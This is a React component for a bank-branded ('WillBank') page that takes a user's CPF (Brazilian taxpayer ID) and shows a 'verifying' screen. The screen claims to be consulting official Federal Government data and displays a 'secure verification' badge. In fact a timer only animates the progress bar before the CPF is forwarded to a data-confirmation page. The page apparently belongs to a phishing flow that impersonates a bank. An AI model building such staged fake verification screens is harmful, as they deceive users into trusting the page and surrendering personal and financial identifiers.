import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Shield } from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import WillBankFooter from "@/components/WillBankFooter";
import { CPFData } from "@/lib/cpf";

const Verificando = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [progress, setProgress] = useState(0);

  const cpfData: CPFData | undefined = location.state?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }

    // Animação de progresso
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setTimeout(() => {
            navigate("/confirma-dados", { state: { cpfData } });
          }, 500);
          return 100;
        }
        return prev + 2;
      });
    }, 60);

    return () => clearInterval(interval);
  }, [cpfData, navigate]);

  if (!cpfData) return null;

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <WillBankHeader />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <WillBankCard className="w-full max-w-md">
          <div className="space-y-10 text-center py-6">
            {/* Animated Shield Icon */}
            <div className="relative w-28 h-28 mx-auto">
              {/* Outer animated ring */}
              <div className="absolute inset-0 rounded-full border-4 border-primary/20 animate-pulse-ring" />
              {/* Middle ring */}
              <div className="absolute inset-2 rounded-full border-3 border-primary/40" />
              {/* Inner ring */}
              <div className="absolute inset-4 rounded-full border-2 border-primary" />
              {/* Shield icon */}
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="w-14 h-14 bg-gradient-to-br from-primary to-amber-400 rounded-full flex items-center justify-center shadow-lg animate-float">
                  <Shield className="w-7 h-7 text-primary-foreground" />
                </div>
              </div>
            </div>

            <div className="space-y-2">
              <h1 className="text-2xl sm:text-3xl font-bold text-foreground tracking-tight">
                Verificando informações
              </h1>
              <p className="text-muted-foreground">
                Consultando dados oficiais do Governo Federal
              </p>
            </div>

            {/* Progress */}
            <div className="space-y-4 px-2">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground font-medium">Progresso da verificação</span>
                <span className="font-bold text-foreground text-lg">{progress}%</span>
              </div>
              <div className="h-3 bg-muted rounded-full overflow-hidden shadow-inner">
                <div 
                  className="h-full bg-gradient-to-r from-primary to-amber-400 transition-all duration-150 rounded-full"
                  style={{ width: `${progress}%` }}
                />
              </div>
              <p className="text-sm text-muted-foreground">
                Aguarde enquanto verificamos seus dados...
              </p>
            </div>

            {/* Security Badge */}
            <div className="inline-flex items-center gap-2.5 bg-primary/10 text-primary px-5 py-2.5 rounded-full text-sm font-semibold shadow-sm">
              <span>🛡️</span>
              <span>Verificação Segura</span>
            </div>
          </div>
        </WillBankCard>
      </main>

      <WillBankFooter />
    </div>
  );
};

export default Verificando;
